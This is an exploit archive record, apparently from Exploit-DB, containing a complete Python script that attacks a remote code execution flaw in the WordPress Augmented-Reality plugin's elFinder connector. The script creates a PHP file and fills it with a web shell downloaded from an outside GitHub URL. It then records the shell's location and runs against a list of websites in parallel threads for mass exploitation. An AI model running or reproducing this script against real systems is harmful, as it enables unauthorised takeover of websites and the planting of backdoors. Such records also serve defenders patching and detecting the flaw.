{"source": "https://www.exploit-db.com/exploits/51788", "vulnName": "Wordpress Augmented-Reality - Remote Code Execution Unauthenticated", "vulnEDBID": "51788", "vulnCVE": "N/A", "author": "MILAD KARIMI", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-09", "vulnContent": "# Exploit Title: Wordpress Augmented-Reality - Remote Code Execution Unauthenticated\n# Date: 2023-09-20\n# Author: Milad Karimi (Ex3ptionaL)\n# Category : webapps\n# Tested on: windows 10 , firefox\n\nimport requests as req\nimport json\nimport sys\nimport random\nimport uuid\nimport urllib.parse\nimport urllib3\nfrom multiprocessing.dummy import Pool as ThreadPool\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\nfilename=\"{}.php\".format(str(uuid.uuid4())[:8])\nproxies = {}\n#proxies = {\n#  'http': 'http://127.0.0.1:8080',\n#  'https': 'http://127.0.0.1:8080',\n#}\nphash = \"l1_Lw\"\nr=req.Session()\nuser_agent={\n\"User-Agent\":\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36\"\n}\nr.headers.update(user_agent)\ndef is_json(myjson):\n  try:\n    json_object = json.loads(myjson)\n  except ValueError as e:\n    return False\n  return True\ndef mkfile(target):\n    data={\"cmd\" : \"mkfile\", \"target\":phash, \"name\":filename}\n    resp=r.post(target, data=data)\n    respon = resp.text\n    if resp.status_code == 200 and is_json(respon):\n        resp_json=respon.replace(r\"\\/\", \"\").replace(\"\\\\\", \"\")\n        resp_json=json.loads(resp_json)\n        return resp_json[\"added\"][0][\"hash\"]\n    else:\n        return False\ndef put(target, hash):\n    content=req.get(\"https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php\", proxies=proxies, verify=False)\n    content=content.text\n    data={\"cmd\" : \"put\", \"target\":hash, \"content\": content}\n    respon=r.post(target, data=data, proxies=proxies, verify=False)\n    if respon.status_code == 200:\n      return True\ndef exploit(target):\n    try:\n        vuln_path = \"{}/wp-content/plugins/augmented-reality/vendor/elfinder/php/connector.minimal.php\".format(target)\n        respon=r.get(vuln_path, proxies=proxies, verify=False).status_code\n        if respon != 200:\n          print(\"[FAIL] {}\".format(target))\n          return\n        hash=mkfile(vuln_path)\n        if hash == False:\n          print(\"[FAIL] {}\".format(target))\n          return\n        if put(vuln_path, hash):\n          shell_path = \"{}/wp-content/plugins/augmented-reality/file_manager/{}\".format(target,filename)\n          status = r.get(shell_path, proxies=proxies, verify=False).status_code\n          if status==200 :\n              with open(\"result.txt\", \"a\") as newline:\n                  newline.write(\"{}\\n\".format(shell_path))\n                  newline.close()\n              print(\"[OK] {}\".format(shell_path))\n              return\n          else:\n              print(\"[FAIL] {}\".format(target))\n              return\n        else:\n          print(\"[FAIL] {}\".format(target))\n          return\n    except req.exceptions.SSLError:\n          print(\"[FAIL] {}\".format(target))\n          return\n    except req.exceptions.ConnectionError:\n          print(\"[FAIL] {}\".format(target))\n          return\ndef main():\n    threads = input(\"[?] Threads > \")\n    list_file = input(\"[?] List websites file > \")\n    print(\"[!] all result saved in result.txt\")\n    with open(list_file, \"r\") as file:\n        lines = [line.rstrip() for line in file]\n        th = ThreadPool(int(threads))\n        th.map(exploit, lines)\nif __name__ == \"__main__\":\n    main()\n            "}